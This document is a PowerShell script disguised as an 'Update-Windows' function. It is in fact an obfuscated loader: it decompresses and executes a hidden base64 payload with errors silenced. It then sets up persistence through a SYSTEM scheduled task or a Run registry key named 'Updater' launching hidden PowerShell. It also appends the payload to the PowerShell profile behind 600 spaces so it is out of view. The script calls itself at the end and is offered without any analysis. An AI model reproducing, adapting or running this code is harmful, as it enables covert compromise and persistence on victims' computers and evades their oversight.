function Update-Windows{
Param([Switch]$Persist)
$ErrorActionPreference='SilentlyContinue'
$Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('tVZtb9pIEP7cSv0PVoVkWyUYCC1JpErnFwxOMIE4mABFp429NguLl9hrAvT6328MdpMq6V2r01kg78vMzswzz+w4SCOPExYJ+323J3x99/ZNH8VoJUiluNEsCyX2Z/s23clv3sBOafmJ1JklfBakqbpeG2yFSDS7uNDTOMYRP84rbczVJMGre0pwIsnCX8JojmN8cn2/wB4XvgqlPyttyu4RzcV2OvLmWDhRIz/b6zIPZR5VnDUlXBK/fBHl6UltVmk9pIgmkujsEo5XFZ9SURa+yZnB290aS6JNvJglLOCVEYlO65VhlKAA9+C0DbYxnzM/EWWIA34x5mkcCXlE2RFHAUmEYT9mnur7MU5AvmJFG7bEUilKKS0Lf0jT3P5NGnGywrDPcczWDo43xMNJpYMin+IbHMykHn4swv5VJem5Ekj1eSyXIRuvOmozP6X4qCvKL13NcijD85RHCP/bu7fv3gZF2qNQf551GL2ZHsYYHJT6LCEHsc9CtSzYYAhxFu9gWrqNUyzPhGkG/XQ2E0oLYvt3zYdRc+IG5Z+fUyuUQAXdB0HfnsPq1GXEn4FWnp9SMjIXV1q283OmGTggETZ2EVoRryCT9BrqOKD4EG+lEOuBZ5KYb2DfwBSHiGcoloXpS7XWivDvulpKqI9j1YPMJeAVJFX+0ZljYiTRimy8AsCOcxHyEACFcSGd03ZXWM/mICTqFCVJWeinUENeWXAwotgvC2qUkHxLTTk7DMUnd+2UcuKhhBfHzeQnJHOLOosSHqceZBGiv3XW2COIZmCUhQ7xsbZzSFhYFl+FQkeUEqANizaQCljJIHB4xo0YnPyBB3LFwdxarSlegeyhrE2KQijivBAOpEIh9sWXvhZEP7I6w6UA5JmnkGyHMl4WXBJzuB8yjHNa/Tdfnl0SuVd6jPMcSUUZTbUdz9hfwpP5x8jM6JoDdoAn5gCNGbOVhhL8qeHwGICT3ivXRFfhGVsRtT1tSWrqI6lZNvyH5NRiRtO/ulx0lNjYzgPVSiy70zcGnU5jc+m4De60LH7Vt7jdulssHLVzMxzziaV2bkl1OW7s15dk73RVf7xVPu21/WNV2+4XoR+MjSAIm4FzU/toku5IH2jVOuoarbQ70h61aiNpkcfOgAwHy0uT349dioaBEt7VzhHZduOFW2P23lLV9vzU218Gbntu+7txRzkfNZZqS1X1qOWaGrsaa7HaV1wUuizW0p1eD3XVPD8jeDIYmtpgYGrqsL14MM6VEHTv0FwbuXUyWd/dzGFuggtXSrVh+XjPxgMAqc1UFN6ATKjXvXkAMsYHVfvQY0kdLTWmaiBjTh7Ar/Ha7FPYvx3WmerS3h1Su5OdqSi1cb+hdqpk1A7V7EgUagOkJhtjbyg112f+6GNvHCjuHW0qhn679gJFUR47xpU3qW3PrpsNrfqgr8iK3td95Xx4pkWPV2F/E/qDUfNm29vdg72horjvM94AcUrJxtrbz8jws1vfRnEyRxRIApd5UbUmi838du4zkmlI0qE5L3EcYQp9DTpfQXeVUuZlDSK7x6E3HTvGDAp3CMPT+qsjWfguKD91jWLp4mICTkLxHDld6eIo5PNydXtarUITqG4bVYjz10PT2Xon5YeVszZyhOfJAD0YkLN6KuHTs3UU/r/Q5XU8h5f/L9A9rf3D7i/BWS3nYb9Y/3Hht6D97dBHiHCQdOAaovjYI19FIOfJs0+KY2KABUH+ZB921yk/6cG3xt8='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC DAILY /ST 20:15:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -NonInteractive`""}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
mkdir (Split-Path -Parent $Prof)
(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} Update-Windows -Persist